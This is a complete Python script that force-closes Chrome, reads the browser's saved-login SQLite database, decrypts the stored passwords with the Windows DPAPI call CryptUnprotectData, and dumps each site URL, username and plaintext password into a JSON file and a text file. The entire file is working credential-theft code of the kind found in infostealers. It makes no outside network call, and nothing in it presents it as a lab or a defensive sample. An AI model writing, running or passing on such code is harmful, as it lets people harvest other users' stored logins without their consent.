import os
import sys
import sqlite3
import csv
import json
import win32crypt

file = open("your passwords.txt", "w+")
os.system("TASKKILL /F /IM chrome.exe")


def args_parser():
    output_json(main())
    return


def main():
    info_list = []
    path = getpath()
    try:
        connection = sqlite3.connect(path + "Login Data")
        with connection:
            cursor = connection.cursor()
            v = cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()

        if (os.name == "posix") and (sys.platform == "darwin"):
            #print("Mac OSX not supported.")
            sys.exit(0)

        for origin_url, username, password in value:
            if os.name == 'nt':
                password = win32crypt.CryptUnprotectData(
                    password, None, None, None, 0)[1]

            if password:
                info_list.append({
                    'origin_url': origin_url,
                    'username': username,
                    'password': str(password)
                })

    except sqlite3.OperationalError as e:
        e = str(e)
        sys.exit(0)

    return info_list


def getpath():

    if os.name == "nt":
        PathName = os.getenv('localappdata') + \
            '\\Google\\Chrome\\User Data\\Default\\'
    elif os.name == "posix":
        PathName = os.getenv('HOME')
        if sys.platform == "darwin":
            PathName += '/Library/Application Support/Google/Chrome/Default/'
        else:
            PathName += '/.config/google-chrome/Default/'
    if not os.path.isdir(PathName):
        print('[!] Chrome Doesn\'t exists')
        sys.exit(0)

    return PathName


def output_json(info):
    try:
        with open('chromepass-passwords.json', 'w') as json_file:
            json.dump({'password_items': info}, json_file, indent=4)
            #print("Data written to chromepass-passwords.json")
    except EnvironmentError:
        print('EnvironmentError: cannot write data')


if __name__ == '__main__':
    args_parser()

opened_json_file = json.load(open("chromepass-passwords.json", "r"))

for i in opened_json_file["password_items"]:
    file.write("your website: " + i["origin_url"] + "\n")
    file.write("your user name: " + i["username"] + "\n")
    file.write("your password: " + i["password"] + "\n\n")
file.close()
